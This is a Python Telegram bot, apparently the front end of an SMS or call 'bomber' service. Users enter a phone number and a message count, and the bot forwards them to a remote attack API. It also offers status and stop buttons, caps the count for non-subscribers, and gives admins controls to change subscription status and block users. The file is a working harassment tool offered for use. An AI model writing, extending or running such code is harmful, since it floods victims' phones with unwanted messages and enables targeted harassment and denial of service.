import re
import ast
import logging
import requests

from aiogram.dispatcher import FSMContext
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage

from stateHandler import STATES
from sqlHandler import SQLHandler
from configHandler import ConfigHandler
from sqlHandler.consts import TYPES, CONSTS, STRINGS
from errorHandling import errorHandler

logging.basicConfig(level=logging.INFO)
bot = Bot(token=ConfigHandler.token)
dispatcher = Dispatcher(bot, storage=MemoryStorage())

database = SQLHandler()


def api_count_check() -> list:
    country_codes = TYPES.params_list
    result = []
    for param in country_codes:
        response = requests.get(
            ConfigHandler.count_link, params=param
        ).json()
        result.append(response.get('count'))
    return result


@dispatcher.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = [
        [
            types.KeyboardButton(TYPES.button_start),
            types.KeyboardButton(TYPES.button_services_count)
        ],
        [
            types.KeyboardButton(TYPES.button_info),
            types.KeyboardButton(TYPES.button_contact)
        ]
    ]

    if message.from_user.id in ast.literal_eval(ConfigHandler.admins):
        keyboard.append(
            [
                types.KeyboardButton(TYPES.button_change),
                types.KeyboardButton(TYPES.button_block),
            ]
        )

    if not database.check_user(ConfigHandler.table_name, message.from_user.id):
        database.add_user(ConfigHandler.table_name, message.from_user.first_name,
                          message.from_user.last_name, message.from_user.username, message.from_user.id)

    markup = types.ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

    await message.answer(STRINGS.start_string, reply_markup=markup)


@dispatcher.message_handler(content_types=['text'], state=None)
async def button_recognizer(message: types.Message):
    if database.check_block(ConfigHandler.table_name, message.from_user.id):
        await message.answer(STRINGS.ban_sting)
        return

    if message.text == TYPES.button_start:
        await message.answer(STRINGS.bomb_string)
        await STATES.bombing.set()

    elif message.text == TYPES.button_services_count:
        counts = api_count_check()
        await message.answer(STRINGS.count_string.format(*counts))

    elif message.text == TYPES.button_info:
        await message.answer(STRINGS.info_string)

    elif message.text == TYPES.button_contact:
        await message.answer(STRINGS.contact_string)

    elif message.text == TYPES.button_change:
        await STATES.changing.set()

    elif message.text == TYPES.button_block:
        await STATES.blocking.set()


@dispatcher.message_handler(state=STATES.bombing)
async def start_bombing(message: types.Message, state: FSMContext):
    try:
        text = message.text.split(' ')
        count = int(text[CONSTS.command_second])

        for pattern in ConfigHandler.pattern_list:
            if re.match(pattern=pattern, string=text[CONSTS.command_first]):
                return

        if not database.check_user_status(ConfigHandler.table_name, message.from_user.id):
            if count > CONSTS.base_laps_count:
                count = CONSTS.base_laps_count

        response = requests.post(
            ConfigHandler.attack_link,
            json={ConfigHandler.api_number: count,
                  ConfigHandler.api_phone: text[CONSTS.command_first]},
        ).json()

        database.update_record(ConfigHandler.table_name, message.from_user.id,
                               text[CONSTS.command_first])

        status = response.get('success')
        identifier = response.get('id')

        await state.update_data(
            {
                'id': identifier
            }
        )

        inline_markup = types.InlineKeyboardMarkup()
        button_status = types.InlineKeyboardButton(text=TYPES.button_status, callback_data=TYPES.callback_status)
        button_stop = types.InlineKeyboardButton(text=TYPES.button_stop, callback_data=TYPES.callback_stop)
        inline_markup.add(button_status, button_stop)

        if status:
            await message.answer(STRINGS.attack_string.format(text[CONSTS.command_first]), reply_markup=inline_markup)
        else:
            return

    except (IndexError, ValueError, TypeError) as error:
        errorHandler(error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.message_handler(state=STATES.changing)
async def change_subscription_status(message: types.Message, state: FSMContext):
    try:
        text = message.text.split(' ')
        database.change_status(ConfigHandler.table_name, text[CONSTS.command_first],
                               bool(int(text[CONSTS.command_second])))
        await message.answer(STRINGS.status_changed.format(text[CONSTS.command_first]))

    except (IndexError, ValueError, TypeError) as error:
        errorHandler(error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.message_handler(state=STATES.blocking)
async def block_user(message: types.Message, state: FSMContext):
    try:
        text = message.text.split(' ')
        database.block_user(ConfigHandler.table_name, text[CONSTS.command_first])
        await message.answer(STRINGS.user_blocked.format(text[CONSTS.command_first]))

    except Exception as error:
        errorHandler(error)
        await message.answer(STRINGS.cancel_string)

    finally:
        await state.reset_state(with_data=False)


@dispatcher.callback_query_handler(lambda call: True)
async def inline_handling(callback_query: types.CallbackQuery, state: FSMContext):
    chat_id = callback_query.message.chat.id
    if callback_query.data == TYPES.callback_status:
        id = await state.get_data()
        id = id.get('id')

        response = requests.get(ConfigHandler.attack_status_link.format(id)).json()
        sent, end = response.get('currently_at'), response.get('end_at')

        await bot.send_message(chat_id, STRINGS.messages_string.format(end - sent))

    elif callback_query.data == TYPES.callback_stop:
        id = await state.get_data()
        id = id.get('id')

        requests.post(ConfigHandler.attack_stop_link.format(id)).json()

        await bot.edit_message_text(chat_id=chat_id, message_id=callback_query.message.message_id,
                                    text=STRINGS.attack_stopped)


if __name__ == '__main__':
    executor.start_polling(dispatcher, skip_updates=True)
